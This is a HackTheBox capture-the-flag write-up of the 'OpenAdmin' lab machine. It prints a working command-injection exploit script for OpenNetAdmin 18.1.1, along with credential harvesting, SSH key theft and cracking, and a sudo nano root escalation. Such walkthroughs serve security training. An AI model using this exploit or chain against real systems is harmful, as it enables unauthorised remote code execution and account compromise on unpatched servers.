---
title: Write-up OpenAdmin Machine
author: pcw3r
date: 2020-04-20 11:33:00 +0800
categories: [HackTheBox, Pentest]
tags: [LINUX, EASY, ENUMERATION, WEB EXPLOITATION, PASSWORD CRACKING, SUDO EXPLOITATION]
math: true
---

**<center>RefÂ°: HTB-05-Pentest</center>**

![Desktop View]({{ "/assets/img/openadmin/HTB-Badge-Openadmin.png" | relative_url }})

--- Openadmin is a Linux machine that highlights the exploitation of RCE through OpenNetAdmin version 18.1.1 to gain a foothold. Lateral movement with enumeration to find clear password in opennetadmin database. Again Lateral movement on 2nd user through vhost wich execute in local the read of her private ssh key. After crack it with john, we get Flag user.

Sudo misconfiguration is present for the second user Joanna. Wich allow the execution of nano command under root permission without password. That to get Flag root.

![Desktop View]({{ "/assets/img/openadmin/HTB-Information-Openadmin.png" | relative_url }})

## **<span style='color:#c0392b'>Discovery - Figure out environment</span>**
### Check all services
***
The nmap scan reveals `SSH` and `Apache` to be running on their usual ports.

```terminal
$ nmap -A -T5 10.10.10.171 -p-
```

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-nmap.png" | relative_url }})

### Web
***
We discover folders named `artwork` and `music` under http://10.10.10.171

```terminal
$ dirb http://10.10.10.171
```

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-dirb.png" | relative_url }})


**Artwork site :** Nothing interesting here.

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-artworksite.png" | relative_url }})

**Music site :** We have redirection on other service through `login button`, wich is `OpenNetAdmin`.

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-musicsite.png" | relative_url }})

OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors. We have version 18.1.1 of the software.

Reference - OpenNetAdmin Software : <https://opennetadmin.com/>

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-opennetadmin.png" | relative_url }})

We have finish our first level of enumeration to find our target. Now we need to find any vulnerabilities to exploit it and gain a foothold.

### Vulnerabilities
***

Here our target is OpenNetAdmin software. We check all vulnerabilities with searchsploit and we find 2 vulnerabilities presents in our version 18.1.1.

```terminal
$ searchsploit opennetadmin
```

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-searchsploit.png" | relative_url }})

We use `Remote Code Execution` to gain our first level access on the target.

### Reviewing Code
Reference - exploit RCE : <https://www.exploit-db.com/exploits/47691>

AJAX arguments allow exploits a command injection in OpenNetAdmin.
The vulnerability exists on the `tooltips.inc.php` component, due to the `insecure usage` of the `shell_exec()` PHP function.

The execution of the RCE dont need to be authenticated or have an authenticated user.

```
#!/bin/bash
URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

## **<span style='color:#c0392b'>Foothold - Get into the target </span>**
### Obtaining Reverse Shell from RCE Execution
***
Be careful, sometime script retrieve from searchsploit database dont work correctly. To remediate this, copy all code in new file.

```terminal
$ searchsploit -m 47691.sh
$ sudo bash 47691.sh http://10.10.10.171/ona/
```

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-exploitrce.png" | relative_url }})

The exploitation is successful and we have gained a foothold.

## **<span style='color:#c0392b'>Lateral Movement - Move through environment</span>**
### Plaintext Password from database
***
Enum with www-data account and check the file `/etc/passwd` to find all system users : `Jimmy and Joanna`

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-passwd.png" | relative_url }})

After reading information on the installation of OpenNetAdmin : <https://github.com/opennetadmin/ona/wiki/Install>

We know that the admin or user password of the software is referenced in her database configuration file : `/var/www/ona/local/config/database_settings.inc.php`

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-confdb.png" | relative_url }})

We find the database credentials `n1nj4W4rri0R!`

We can test ssh connection with this password and one of the both user finding below. This password is reused by the user system Jimmy.

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-sshjimmy.png" | relative_url }})

### Reading id_rsa
***
We continue to enum www folder and we find interesting folder internal.
This folder is manage only by our user. Let's check in to find anything.

We find 3 php files : `index.php`, `logout.php` and `main.php`

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-internalfolder.png" | relative_url }})

We have the possibility to read the ssh private key of our 2nd user (Joanna) with the php function `shell_exec` through the page `main.php`

```
...
$output = shell_exec('cat /home/joanna/id_rsa');
...
```

It makes sense to look vhost and see if we matching with our folder internal.
We find vhost assign to Joanna on port `52846` below `/etc/apache2/sites-enabled/internal.conf`

```
VirtualHost 127.0.0.1:52846
...
DocumentRoot /var/www/internal
```

So we have now everything we need to grab the private key of our 2nd system user.

```terminal
$ curl 127.0.0.1/52846/main.php
```

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-privkeyssh.png" | relative_url }})

### Cracking Password
***
We retrieve the private key to exploit it with JohnTheRipper on our attacking machine.

Reference - johntheripper tool : <https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c>

```terminal
$ sudo python2 ssh2john.py sshprivkey_joanna > joanna.hash
$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash
```

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-jtrfind.png" | relative_url }})

We crack the password of the user Joanna : `bloodninjas`

Fix the warning on the unprotected ssh key file and connect on with ssh to grab the flag user.

Reference - fix warning unprotected private key : <https://www.howtogeek.com/168119/fixing-warning-unprotected-private-key-file-on-linux>

```terminal
$ sudo chmod 600 sshprivkey_joanna
```

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-sshjoanna.png" | relative_url }})

We flag the user to validate the compromission of the system users.

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-flaguser.png" | relative_url }})

## **<span style='color:#c0392b'>Privilege Escalation - Gain higher-level permissions</span>**
### Sudo Misconfiguration
***
```terminal
$ sudo -l
```

User Joanna may run the following commands with no password `(ALL) NOPASSWD: /bin/nano /opt/priv`

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-sudopermission.png" | relative_url }})

We run this command to gain root access on the server :

```terminal
$ sudo /bin/nano /opt/priv
```
We have opening of one blank page under root permission. At this moment we can do everything.

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-blankpageroot.png" | relative_url }})

And we flag the root account to validate the compromission of the system.

Go to read file with key combination `^R`.

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-Rtouch.png" | relative_url }})

Insert the file we want to read.

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-pathroot.png" | relative_url }})

### Flag root
***
We grab our flag root value !

![Desktop View]({{ "/assets/img/openadmin/HTB-Images-Openadmin-flagroot.png" | relative_url }})


***

## **<center>Trophy</center>**

> **It's never too late to start.**
>
> Me, Myself and I
